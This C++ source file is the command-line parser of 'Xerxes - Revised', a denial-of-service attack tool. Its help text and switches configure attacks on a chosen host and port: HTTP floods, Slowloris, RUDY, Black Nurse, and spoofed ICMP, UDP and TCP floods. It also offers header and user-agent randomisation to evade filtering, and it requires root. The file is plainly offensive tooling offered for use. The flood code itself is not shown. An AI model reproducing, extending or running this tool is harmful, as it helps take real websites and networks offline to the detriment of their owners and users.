#include <iostream>
#include <fstream>
#include <vector>
#include <unistd.h>
#include <cstring>
#include "Parser.hpp"

void Parser::help() {
    std::string message{"Usage: ./Xerxes -host <website> -port <port> -T <threads> -C <connections> <options>\n"
                        "\nOptions:\n"
                                "                -h               set attack vector to HTTP\n"
                                "                -i               set attack vector to Spoofed ICMP Flood\n"
                                "                -r               set attack vector to Rudy\n"
                                "                -s               set attack vector to Slowloris\n"
                                "                -b               set attack vector to Black Nurse\n"
                                "                -be              set attack vector to Beast\n"
                                "                -nu              set attack vector to NULLUDP\n"
                                "                -nt              set attack vector to NULLTCP\n"
                                "                -ft              set attack vector to TCPFlood\n"
                                "                -fu              set attack vector to UDPFlood\n"
                                "                -su              set attack vector to Spoofed UDP Flood\n"
                                "                -st              set attack vector to Spoofed TCP Flood\n"
                                "                -ss              enable SSL\n"
                                "                -w               wait for hosts response\n"
                                "                -rh              randomize HTTP Header\n"
                                "                -ru              randomize HTTP UserAgent\n"
                                "                -qq              set verbosity to quiet quiet\n"
                                "                -q               set verbosity to quiet\n"
                                "                -v               set verbosity to verbose\n"
                                "                -vv              set verbosity to very verbose\n"
                                "                -D               set delay in microseconds\n"
                                "                -T               set number of threads\n"
                                "                -C               set number of connections per thread\n"
                                "                -host            set host ip or url\n"
                                "                -port            set host port number\n"
                                "                -help            show help\n"
                                "                -version         show version\n"
    };
    std::cout << message << std::endl;
    exit(EXIT_SUCCESS);
}

void Parser::show_banner() {
    std::cout << "Xerxes version " << Version << " " << Time << " (Xerxes - Revised)" << std::endl;
}

void Parser::parse_commandline(int argc, const char *argv[]) {

    for (int i = 1; i < argc; i++){
        if(!strcmp(argv[i], "-h")){
            conf->vector = config::HTTP;
            conf->protocol = config::TCP;
        }else if(!strcmp(argv[i], "-nu")){
            conf->vector = config::NullUDP;
            conf->protocol = config::UDP;
        }else if(!strcmp(argv[i], "-nt")){
            conf->vector = config::NullTCP;
            conf->protocol = config::TCP;
        }else if(!strcmp(argv[i], "-fu")){
            conf->vector = config::UDPFlood;
            conf->protocol = config::UDP;
        }else if(!strcmp(argv[i], "-ft")) {
            conf->vector = config::TCPFlood;
            conf->protocol = config::TCP;
        }else if(!strcmp(argv[i], "-r")){
            conf->vector = config::Rudy;
            conf->protocol = config::TCP;
            conf->delay = 10000000;
        }else if(!strcmp(argv[i], "-ru")){
            conf->RandomizeUserAgent = true;
        }else if(!strcmp(argv[i], "-rh")){
            conf->RandomizeHeader = true;
        }else if(!strcmp(argv[i], "-w")) {
            conf->GetResponse = true;
        }else if(!strcmp(argv[i], "-s")){
            conf->vector = config::Slowloris;
            conf->protocol = config::TCP;
            conf->delay = 10000000;
        }else if(!strcmp(argv[i], "-ss")){
            conf->UseSSL = true;
        }else if(!strcmp(argv[i], "-su")){
            conf->vector = config::SpoofedUDP;
        }else if(!strcmp(argv[i], "-st")){
            conf->vector = config::SpoofedTCP;
        }else if(!strcmp(argv[i], "-q")){
            logger->setLevel(Logger::Error);
        }else if(!strcmp(argv[i], "-qq")){
            logger->setLevel(Logger::None);
        }else if(!strcmp(argv[i], "-v")){
            logger->setLevel(Logger::Warning);
        }else if(!strcmp(argv[i], "-vv")){
            logger->setLevel(Logger::Info);
        }else if(!strcmp(argv[i], "-i")) {
            conf->vector = config::ICMPFlood;
        }else if(!strcmp(argv[i], "-b")) {
            conf->vector = config::Blacknurse;
        }else if(!strcmp(argv[i], "-be")){
            conf->vector = config::Beast;
        }else if(!strcmp(argv[i], "-host")){
            conf->website = static_cast<std::string>(argv[i+1]);
        }else if(!strcmp(argv[i], "-port")){
            conf->port = static_cast<std::string>(argv[i+1]);
        }else if(!strcmp(argv[i], "-T")){
            if(Validator::isValidNumber(argv[i+1])){
                conf->THREADS = static_cast<int>(strtol(argv[i+1], nullptr, 10));
            }
        }else if(!strcmp(argv[i], "-C")){
            if(Validator::isValidNumber(argv[i+1])){
                conf->CONNECTIONS = static_cast<int>(strtol(argv[i+1], nullptr, 10));
            }
        }else if(!strcmp(argv[i], "-D")){
            if(Validator::isValidNumber(argv[i+1])){
                conf->delay = static_cast<int>(strtol(argv[i+1], nullptr, 10));
            }
        }else if(!strcmp(argv[i], "-version")){
            exit(EXIT_SUCCESS);
        }else if(!strcmp(argv[i], "-help")){
            help();
        }
    }
    check_root();
    getUserAgents();
}

Parser::Parser() = default;

Parser::Parser(config *conf, Logger *logger) : conf{conf}, logger{logger}{

}

void Parser::getUserAgents() {
    std::ifstream filestream("useragents");
    std::string line{};
    if(filestream.good() & filestream.is_open()){
        while(getline(filestream, line)){
            conf->useragents.push_back(line);
        }
        filestream.close();
    }else{
        logger->Log("Unable to find useragents file", Logger::Warning);
    }
}

void Parser::check_root() {
    if(getuid()){
        logger->Log("You need to be root", Logger::Error);
        exit(EXIT_FAILURE);
    }
}
